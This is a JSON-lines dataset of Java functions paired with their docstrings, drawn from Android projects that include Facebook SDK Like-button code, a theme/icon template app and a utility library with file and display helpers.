{"docstring": "/**\n * NOTE: This MUST be called ONLY via the SerializeToDiskWorkItem class to ensure that it happens on the\n * right thread, at the right time.\n */\n", "func_signal": "private static void serializeToDiskSynchronously(String cacheKey, String controllerJson)", "code": "{\n    OutputStream outputStream = null;\n    try {\n        outputStream = controllerDiskCache.openPutStream(cacheKey);\n        outputStream.write(controllerJson.getBytes());\n    } catch (IOException e) {\n        Log.e(TAG, \"Unable to serialize controller to disk\", e);\n    } finally {\n        if (outputStream != null) {\n            Utility.closeQuietly(outputStream);\n        }\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\LikeActionController.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Sets the facebook:horizontal_alignment for this LikeView. Can be changed during runtime.\n * @param horizontalAlignment Should be either LikeView.LEFT, LikeView.CENTER or LikeView.RIGHT\n */\n", "func_signal": "public void setHorizontalAlignment(HorizontalAlignment horizontalAlignment)", "code": "{\n    horizontalAlignment = horizontalAlignment != null ? horizontalAlignment : HorizontalAlignment.DEFAULT;\n    if (this.horizontalAlignment != horizontalAlignment) {\n        this.horizontalAlignment = horizontalAlignment;\n\n        updateLayout();\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\widget\\LikeView.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Sets the associated object for this LikeView. Can be changed during runtime.\n * @param objectId Object Id\n */\n", "func_signal": "public void setObjectId(String objectId)", "code": "{\n    objectId = Utility.coerceValueIfNullOrEmpty(objectId, null);\n    if (!Utility.areObjectsEqual(objectId, this.objectId)) {\n        setObjectIdForced(objectId);\n\n        updateLikeStateAndLayout();\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\widget\\LikeView.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Entry-point to the code that performs the like/unlike action.\n */\n", "func_signal": "public void toggleLike(Activity activity, Bundle analyticsParameters)", "code": "{\n    appEventsLogger.logSdkEvent(AnalyticsEvents.EVENT_LIKE_VIEW_DID_TAP, null, analyticsParameters);\n\n    boolean shouldLikeObject = !this.isObjectLiked;\n    if (canUseOGPublish(shouldLikeObject)) {\n        // Update UI state optimistically\n        updateState(shouldLikeObject,\n                this.likeCountStringWithLike,\n                this.likeCountStringWithoutLike,\n                this.socialSentenceWithLike,\n                this.socialSentenceWithoutLike,\n                this.unlikeToken);\n        if (isPendingLikeOrUnlike) {\n            // If the user toggled the button quickly, and there is still a publish underway, don't fire off\n            // another request. Also log this behavior.\n\n            appEventsLogger.logSdkEvent(AnalyticsEvents.EVENT_LIKE_VIEW_DID_UNDO_QUICKLY, null, analyticsParameters);\n            return;\n        }\n    }\n\n    performLikeOrUnlike(activity, shouldLikeObject, analyticsParameters);\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\LikeActionController.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Sets the facebook:style for this LikeView. Can be changed during runtime.\n * @param likeViewStyle Should be either LikeView.STANDARD, LikeView.BUTTON or LikeView.BOX_COUNT\n */\n", "func_signal": "public void setLikeViewStyle(Style likeViewStyle)", "code": "{\n    likeViewStyle = likeViewStyle != null ? likeViewStyle : Style.DEFAULT;\n    if (this.likeViewStyle != likeViewStyle) {\n        this.likeViewStyle = likeViewStyle;\n\n        updateLayout();\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\widget\\LikeView.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Sets the facebook:foreground_color for this LikeView. Can be changed during runtime.\n * The color is only used for the social sentence text.\n * @param foregroundColor And valid android.graphics.Color value.\n */\n", "func_signal": "public void setForegroundColor(int foregroundColor)", "code": "{\n    if (this.foregroundColor != foregroundColor) {\n        socialSentenceView.setTextColor(foregroundColor);\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\widget\\LikeView.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Called by the LikeView when an object-id is set on it.\n * @param context context\n * @param objectId Object Id\n * @return A LikeActionController for the specified object id\n */\n", "func_signal": "public static void getControllerForObjectId(\n        Context context,\n        String objectId,\n        CreationCallback callback)", "code": "{\n    if (!isInitialized) {\n        performFirstInitialize(context);\n    }\n\n    LikeActionController controllerForObject = getControllerFromInMemoryCache(objectId);\n    if (controllerForObject != null) {\n        // Direct object-cache hit\n        invokeCallbackWithController(callback, controllerForObject);\n    } else {\n        diskIOWorkQueue.addActiveWorkItem(new CreateLikeActionControllerWorkItem(context, objectId, callback));\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\LikeActionController.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Sets the facebook:auxiliary_view_position for this LikeView. Can be changed during runtime.\n * @param auxiliaryViewPosition Should be either LikeView.TOP, LikeView.INLINE or LikeView.BOTTOM\n */\n", "func_signal": "public void setAuxiliaryViewPosition(AuxiliaryViewPosition auxiliaryViewPosition)", "code": "{\n    auxiliaryViewPosition = auxiliaryViewPosition != null ? auxiliaryViewPosition : AuxiliaryViewPosition.DEFAULT;\n    if (this.auxiliaryViewPosition != auxiliaryViewPosition) {\n        this.auxiliaryViewPosition = auxiliaryViewPosition;\n\n        updateLayout();\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\widget\\LikeView.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * NOTE: This MUST be called ONLY via the CreateLikeActionControllerWorkItem class to ensure that it happens on the\n * right thread, at the right time.\n */\n", "func_signal": "private static void createControllerForObjectId(\n        Context context,\n        String objectId,\n        CreationCallback callback)", "code": "{\n    // Check again to see if the controller was created before attempting to deserialize/create one.\n    // Need to check this in the case where multiple LikeViews are looking for a controller for the same object\n    // and all got queued up to create one. We only want the first one to go through with the creation, and the\n    // rest should get the same instance from the object-cache.\n    LikeActionController controllerForObject = getControllerFromInMemoryCache(objectId);\n    if (controllerForObject != null) {\n        // Direct object-cache hit\n        invokeCallbackWithController(callback, controllerForObject);\n        return;\n    }\n\n    // Try deserialize from disk\n    controllerForObject = deserializeFromDiskSynchronously(context, objectId);\n\n    if (controllerForObject == null) {\n        controllerForObject = new LikeActionController(context, Session.getActiveSession(), objectId);\n        serializeToDiskAsync(controllerForObject);\n    }\n\n    // Update object-cache.\n    putControllerInMemoryCache(objectId, controllerForObject);\n\n    // Refresh the controller on the Main thread.\n    final LikeActionController controllerToRefresh = controllerForObject;\n    handler.post(new Runnable() {\n        @Override\n        public void run() {\n            controllerToRefresh.refreshStatusAsync();\n        }\n    });\n\n    invokeCallbackWithController(callback, controllerToRefresh);\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\LikeActionController.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "// Opens an output stream for the key, and creates an input stream wrapper to copy\n// the contents of input into the new output stream.  The effect is to store a\n// copy of input, and associate that data with key.\n", "func_signal": "public InputStream interceptAndPut(String key, InputStream input) throws IOException", "code": "{\n    OutputStream output = openPutStream(key);\n    return new CopyingInputStream(input, output);\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\FileLruCache.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "// If attributes were present, parseAttributes MUST be called before initialize() to ensure proper behavior\n", "func_signal": "private void initialize(Context context)", "code": "{\n    edgePadding = getResources().getDimensionPixelSize(R.dimen.com_facebook_likeview_edge_padding);\n    internalPadding = getResources().getDimensionPixelSize(R.dimen.com_facebook_likeview_internal_padding);\n    if (foregroundColor == NO_FOREGROUND_COLOR) {\n        foregroundColor = getResources().getColor(R.color.com_facebook_likeview_text_color);\n    }\n\n    setBackgroundColor(Color.TRANSPARENT);\n\n    containerView = new LinearLayout(context);\n    LayoutParams containerViewLayoutParams = new LayoutParams(\n            LayoutParams.WRAP_CONTENT,\n            LayoutParams.WRAP_CONTENT);\n    containerView.setLayoutParams(containerViewLayoutParams);\n\n    initializeLikeButton(context);\n    initializeSocialSentenceView(context);\n    initializeLikeCountView(context);\n\n    containerView.addView(likeButton);\n    containerView.addView(socialSentenceView);\n    containerView.addView(likeBoxCountView);\n\n    addView(containerView);\n\n    setObjectIdForced(this.objectId);\n    updateLikeStateAndLayout();\n}", "path": "libs\\facebook\\src\\com\\facebook\\widget\\LikeView.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "// The value of tag should be a final String that works as a directory name.\n", "func_signal": "public FileLruCache(Context context, String tag, Limits limits)", "code": "{\n    this.tag = tag;\n    this.limits = limits;\n    this.directory = new File(context.getCacheDir(), tag);\n    this.lock = new Object();\n\n    // Ensure the cache dir exists\n    if (this.directory.mkdirs() || this.directory.isDirectory()) {\n        // Remove any stale partially-written files from a previous run\n        BufferFile.deleteAll(this.directory);\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\FileLruCache.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Constructor\n */\n", "func_signal": "private LikeActionController(Context context, Session session, String objectId)", "code": "{\n    this.context = context;\n    this.session = session;\n    this.objectId = objectId;\n\n    appEventsLogger = AppEventsLogger.newLogger(context, session);\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\LikeActionController.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Adds a batch-level callback which will be called when the entire batch has finished executing.\n *\n * @param callback the callback\n */\n", "func_signal": "public void addCallback(Callback callback)", "code": "{\n    if (!callbacks.contains(callback)) {\n        callbacks.add(callback);\n    }\n}", "path": "libs\\facebook\\src\\com\\facebook\\RequestBatch.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * NOTE: This MUST be called ONLY via the CreateLikeActionControllerWorkItem class to ensure that it happens on the\n * right thread, at the right time.\n */\n", "func_signal": "private static LikeActionController deserializeFromDiskSynchronously(\n        Context context,\n        String objectId)", "code": "{\n    LikeActionController controller = null;\n\n    InputStream inputStream = null;\n    try {\n        String cacheKey = getCacheKeyForObjectId(objectId);\n        inputStream = controllerDiskCache.get(cacheKey);\n        if (inputStream != null) {\n            String controllerJsonString = Utility.readStreamToString(inputStream);\n            if (!Utility.isNullOrEmpty(controllerJsonString)) {\n                controller = deserializeFromJson(context, controllerJsonString);\n            }\n        }\n    } catch (IOException e) {\n        Log.e(TAG, \"Unable to deserialize controller from disk\", e);\n        controller = null;\n    } finally {\n        if (inputStream != null) {\n            Utility.closeQuietly(inputStream);\n        }\n    }\n\n    return controller;\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\LikeActionController.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Constructor\n *\n * @param context Context for this View\n */\n", "func_signal": "public LikeView(Context context)", "code": "{\n    super(context);\n    initialize(context);\n}", "path": "libs\\facebook\\src\\com\\facebook\\widget\\LikeView.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Constructor.\n * @param requests the requests to add to the batch\n */\n", "func_signal": "public RequestBatch(RequestBatch requests)", "code": "{\n    this.requests = new ArrayList<Request>(requests);\n    this.callbackHandler = requests.callbackHandler;\n    this.timeoutInMilliseconds = requests.timeoutInMilliseconds;\n    this.callbacks = new ArrayList<Callback>(requests.callbacks);\n}", "path": "libs\\facebook\\src\\com\\facebook\\RequestBatch.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/** Called when the activity is first created. */\n", "func_signal": "public void onCreate(Bundle savedInstanceState)", "code": "{\n    super.onCreate(savedInstanceState);\n    int iconSize=getResources().getDimensionPixelSize(android.R.dimen.app_icon_size);\n    setContentView(R.layout.icon_main);\n    GridView g=(GridView) findViewById(R.id.icon_grid);\n    g.setNumColumns(GridView.AUTO_FIT);\n    g.setColumnWidth(iconSize);\n    g.setStretchMode(GridView.STRETCH_SPACING_UNIFORM);\n    g.setVerticalSpacing(iconSize/3);\n    g.setOnItemClickListener(this);\n    IconsAdapter adapter=new IconsAdapter(this,iconSize);\n    g.setAdapter(adapter);\n    if(getIntent().getAction().equals(ACTION_ADW_PICK_ICON)){\n    \tmPickerMode=true;\n    }\n\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\adw.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "/** Called when your activity is no longer visible */\n", "func_signal": "@Override\npublic void onStop()", "code": "{\n\tsuper.onStop();\n\t\n\t// Remove listeners to prevent weird issues\n\tremoveListeners();\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\IconRequest.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//This activity is what displays the icon fragments (the icon categories) see iconfragment for the tabs themselves\n", "func_signal": "@Override\n\t    public void onCreate(Bundle savedInstanceState)", "code": "{\n\n\t        super.onCreate(savedInstanceState);\n\t        setContentView(R.layout.activity_icon);\n\tmShareIntent = new Intent();\n\tmShareIntent.setAction(Intent.ACTION_SEND);\n\tmShareIntent.setType(\"text/plain\");\n\tmShareIntent.putExtra(Intent.EXTRA_TEXT, \"From me to you, this text is new.\");\n\n\t        \n\t        tabs = (PagerSlidingTabStrip) findViewById(R.id.tabs);\n\tViewPager pager = (ViewPager) findViewById(R.id.pager);\n\n\tadapter = new IconPagerAdapter(getSupportFragmentManager());\n\n\tpager.setAdapter(adapter);\n\t\n\n\tfinal int pageMargin = (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 4, getResources()\n\t\t\t.getDisplayMetrics());\n\tpager.setPageMargin(pageMargin);\n\n\ttabs.setViewPager(pager);\n\n\t    }", "path": "src\\com\\designrifts\\ultimatethemeui\\IconActivity.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//The following act relates to the information to link to the github and forum posts of this template, you are free to remove \n", "func_signal": "private void actXDA()", "code": "{\n\t Uri extras1uriString = Uri.parse(getString(R.string.xda_link)); //use this to link to your UCCW skins on Play or Website\n   Intent extras1Intent = new Intent(\"android.intent.action.VIEW\", extras1uriString);\n   try {\n\t\t  startActivity(extras1Intent);\n\t\t} catch (ActivityNotFoundException e2) {\n\t\t  e2.printStackTrace();\n\t\t}\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\fragments\\FragmentExtras.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "/** Called when your activity... starts */\n", "func_signal": "@Override\npublic void onStart()", "code": "{\n\tsuper.onStart();\n\t\n\t// Set onClick & progress listeners\n\tsetListeners();\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\IconRequest.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n\n    addIcon(resources, packageName, R.array.gamesicons);\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\iconfragment\\IconFragmentGames.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n\n    addIcon(resources, packageName, R.array.playicons);\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\iconfragment\\IconFragmentPlay.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadDocks()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getApplication().getPackageName();\n\n    addDocks(resources, packageName, R.array.dock_pack);\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\docks.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//This displays tab names and how to switch, if you remove a tab, remove its case below but make sure to keep the order (0,1,2)\n", "func_signal": "@Override\npublic CharSequence getPageTitle(int position)", "code": "{\n\tLocale l = Locale.getDefault();\n\tswitch (position) {\n\tcase 0:\n\t\treturn getString(R.string.tab1).toUpperCase(l);\n\tcase 1:\n\t\treturn getString(R.string.tab2).toUpperCase(l);\n\tcase 2:\n\t\treturn getString(R.string.tab3).toUpperCase(l);\n\tcase 3:\n\t\treturn getString(R.string.tab4).toUpperCase(l);\t\n\t}\n\treturn null;\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\ThemeActivity.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "/** Called when the activity is first created. */\n", "func_signal": "@Override\nprotected void onCreate(Bundle savedInstanceState)", "code": "{\n        getActionBar().setBackgroundDrawable(new ColorDrawable(getResources().getColor(android.R.color.holo_blue_dark)));\n        getActionBar().setDisplayShowHomeEnabled(true);\n\tsuper.onCreate(savedInstanceState);\n\tsetContentView(R.layout.main);\n\n\t// Initialize your views (Button)\n\tinitViews();\n\t\n\t// Initialize the PkRequestManager\n\tinitRequestManager();\n\t\n\t// Initialize your progress dialog\n\tprogressDialog = new ProgressDialog(this);\n\tprogressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);\n\tprogressDialog.setMessage(\"\");\n\t\n\t// Initialize your UI Handler. This is for modifying your UI from a background thread\n\tmHandler = new Handler();\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\IconRequest.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//This is the share menu\n", "func_signal": "public boolean onCreateOptionsMenu(Menu menu)", "code": "{\n // Inflate the menu; this adds items to the action bar if it is present.\n getMenuInflater().inflate(R.menu.share_menu, menu);\n MenuItem item = menu.findItem(R.id.menu_item_share);\n mShareActionProvider = (ShareActionProvider) item.getActionProvider();\n // Create the share Intent\n String playStoreLink = \" https://play.google.com/store/apps/details?id=\" +\n     getPackageName();\n String yourShareText = getString(R.string.share_this) + playStoreLink;\n Intent shareIntent = ShareCompat.IntentBuilder.from(this)\n     .setType(\"text/plain\").setText(yourShareText).getIntent();\n // Set the share Intent\n mShareActionProvider.setShareIntent(shareIntent);\n return true;\n\t}", "path": "src\\com\\designrifts\\ultimatethemeui\\ThemeActivity.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcons()", "code": "{\n\t        mThumbs = new ArrayList<Integer>();\n\n\t        final Resources resources = getResources();\n\t        final String packageName = getApplication().getPackageName();\n\n\t        addIcons(resources, packageName, R.array.icon_pack);\n\t    }", "path": "src\\com\\designrifts\\ultimatethemeui\\adw.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n\n    addIcon(resources, packageName, R.array.latesticons);\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\iconfragment\\IconFragmentLatest.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n\n    addIcon(resources, packageName, R.array.systemicons);\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\iconfragment\\IconFragmentSystem.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//The below items are the actions attached to the cards, i.e. what the cards will do, if you will not be using a card, you can remove the act\n", "func_signal": "private void actPlay()", "code": "{\n    \tUri marketuriString = Uri.parse(getString(R.string.play_link)); \n    \tIntent playintent = new Intent(Intent.ACTION_VIEW, marketuriString);\n    \ttry {\n    \t\tstartActivity(playintent);\n    \t} catch (ActivityNotFoundException e2) {\n    \t\te2.printStackTrace();\n    \t\tToast.makeText(getActivity().getApplicationContext(), \"Play Store not found!\", Toast.LENGTH_LONG).show();\n    \t}\n    }", "path": "src\\com\\designrifts\\ultimatethemeui\\fragments\\FragmentExtras.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//These are the tabs in the main display, if you remove a tab (fragment) you must remove it from below. also, ensure you keep the cases in order or it will not know what to do\n", "func_signal": "@Override\npublic Fragment getItem(int position)", "code": "{\n\tFragment f = new Fragment();\n\tswitch(position){\n\tcase 0:\n\t\tf= new FragmentTheme();\t\n\t\tbreak;\n\tcase 1:\n\t\tf= new FragmentExtras();\n\t\tbreak;\n\tcase 2:\n\t\tf= new FragmentContact();\t\n\t\tbreak;\n\tcase 3:\n\t\tf= new FragmentAbout();\t\n\t\tbreak;\t\n\t}\n\treturn f;\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\ThemeActivity.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n\n    addIcon(resources, packageName, R.array.miscicons);\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\iconfragment\\IconFragmentMisc.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//The following act relates to the information to link to the github and forum posts of this template, you are free to remove \n", "func_signal": "private void actRootzwiki()", "code": "{\n\t Uri extras1uriString = Uri.parse(getString(R.string.rootzwiki_link)); //use this to link to your UCCW skins on Play or Website\n   Intent extras1Intent = new Intent(\"android.intent.action.VIEW\", extras1uriString);\n   try {\n\t\t  startActivity(extras1Intent);\n\t\t} catch (ActivityNotFoundException e2) {\n\t\t  e2.printStackTrace();\n\t\t}\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\fragments\\FragmentExtras.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//The below section is what tells the card to perform the above action when clicked\n", "func_signal": "@Override\npublic void onCardClick(int position, CardBase card, View view)", "code": "{\n\tString str = card.getTitle();\n\tif (str.equals(getString(R.string.play))) {\n\t\tactPlay();\n\t}\n\t//The following if relates to the information to link to the github and forum posts of this template, you are free to remove \n\tif (str.equals(getString(R.string.github))) {\n\t\tactGithub();\n\t}\n\t//The following act relates to the information to link to the github and forum posts of this template, you are free to remove \n\tif (str.equals(getString(R.string.rootzwiki))) {\n\t\tactRootzwiki();\n\t}\n\t//The following act relates to the information to link to the github and forum posts of this template, you are free to remove \n\tif (str.equals(getString(R.string.xda))) {\n\t\tactXDA();\n\t}\n\tif (str.equals(getString(R.string.wallpaper))) {\n\t\tactWallpapers();\n\t}\n\tif (str.equals(getString(R.string.icon))) {\n\t\tactIcons();\n\t}\n\tif (str.equals(getString(R.string.request))) {\n\t\tactRequest();\n\t}\n\tif (str.equals(getString(R.string.uccw))) {\n\t\tactUCCW();\n\t}\n\tif (str.equals(getString(R.string.zooper))) {\n\t\tactZooper();\n\t}\n\tif (str.equals(getString(R.string.extras1))) {\n\t\tactExtras1();\n\t}\n\tif (str.equals(getString(R.string.extras2))) {\n\t\tactExtras2();\n\t}\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\fragments\\FragmentExtras.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "//The following act relates to the information to link to the github and forum posts of this template, you are free to remove \n", "func_signal": "private void actGithub()", "code": "{\n\t Uri extras1uriString = Uri.parse(getString(R.string.github_link)); //use this to link to your UCCW skins on Play or Website\n   Intent extras1Intent = new Intent(\"android.intent.action.VIEW\", extras1uriString);\n   try {\n\t\t  startActivity(extras1Intent);\n\t\t} catch (ActivityNotFoundException e2) {\n\t\t  e2.printStackTrace();\n\t\t}\n\n}", "path": "src\\com\\designrifts\\ultimatethemeui\\fragments\\FragmentExtras.java", "repo_name": "designrifts/Ultimate_Theme_UI_Template", "stars": 125, "license": "None", "language": "java", "size": 13285}
{"docstring": "/**\n * \u6839\u636e\u624b\u673a\u7684\u5206\u8fa8\u7387\u4ece px(\u50cf\u7d20) \u7684\u5355\u4f4d \u8f6c\u6210\u4e3a dp\n */\n", "func_signal": "public static int px2dip(Context context, float pxValue)", "code": "{\n\tfinal float scale = context.getResources().getDisplayMetrics().density;\n\treturn (int) (pxValue / scale + 0.5f);\n}", "path": "src\\com\\finddreams\\baselib\\utils\\DisplayUtil.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * Set the margin between pages.\n *\n * @param marginPixels Distance between adjacent pages in pixels\n * @see #getPageMargin()\n * @see #setPageMarginDrawable(android.graphics.drawable.Drawable)\n * @see #setPageMarginDrawable(int)\n */\n", "func_signal": "public void setPageMargin(int marginPixels)", "code": "{\n    final int oldMargin = mPageMargin;\n    mPageMargin = marginPixels;\n\n    final int width = getWidth();\n    recomputeScrollPosition(width, width, marginPixels, oldMargin);\n\n    requestLayout();\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * We only want the current page that is being shown to be focusable.\n */\n", "func_signal": "@Override\nprotected boolean onRequestFocusInDescendants(int direction,\n        Rect previouslyFocusedRect)", "code": "{\n    int index;\n    int increment;\n    int end;\n    int count = getChildCount();\n    if ((direction & FOCUS_FORWARD) != 0) {\n        index = 0;\n        increment = 1;\n        end = count;\n    } else {\n        index = count - 1;\n        increment = -1;\n        end = -1;\n    }\n    for (int i = index; i != end; i += increment) {\n        View child = getChildAt(i);\n        if (child.getVisibility() == VISIBLE) {\n            ItemInfo ii = infoForChild(child);\n            if (ii != null && ii.position == mCurItem) {\n                if (child.requestFocus(direction, previouslyFocusedRect)) {\n                    return true;\n                }\n            }\n        }\n    }\n    return false;\n}", "path": "src\\com\\finddreams\\baselib\\view\\LazyViewPager.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * \u521b\u5efa\u6587\u4ef6\n * \n * @param path\n *            \u6587\u4ef6\u8def\u5f84\n * @return \u521b\u5efa\u7684\u6587\u4ef6\n */\n", "func_signal": "public static File createNewFile(String path)", "code": "{\n\tFile file = new File(path);\n\tif (!file.exists()) {\n\t\ttry {\n\t\t\tfile.createNewFile();\n\t\t} catch (IOException e) {\n\t\t\treturn null;\n\t\t}\n\t}\n\treturn file;\n}", "path": "src\\com\\finddreams\\baselib\\utils\\FileUtil.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * \u8bfb\u53d6\u8f93\u5165\u6d41\u6570\u636e\n *\n * @param inStream\n * @return\n */\n", "func_signal": "public static byte[] read(InputStream inStream) throws Exception", "code": "{\n    ByteArrayOutputStream outStream = new ByteArrayOutputStream();\n    byte[] buffer = new byte[1024];\n    int len = 0;\n    while ((len = inStream.read(buffer)) != -1) {\n        outStream.write(buffer, 0, len);\n    }\n    inStream.close();\n    return outStream.toByteArray();\n}", "path": "src\\com\\finddreams\\baselib\\utils\\FileUtil.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
{"docstring": "/**\n * \u521b\u5efa\u6839\u76ee\u5f55\n * \n * @param path\n *            \u76ee\u5f55\u8def\u5f84\n */\n", "func_signal": "public static void createDirFile(String path)", "code": "{\n\tFile dir = new File(path);\n\tif (!dir.exists()) {\n\t\tdir.mkdirs();\n\t}\n}", "path": "src\\com\\finddreams\\baselib\\utils\\FileUtil.java", "repo_name": "finddreams/Android_BaseLib", "stars": 90, "license": "None", "language": "java", "size": 2888}
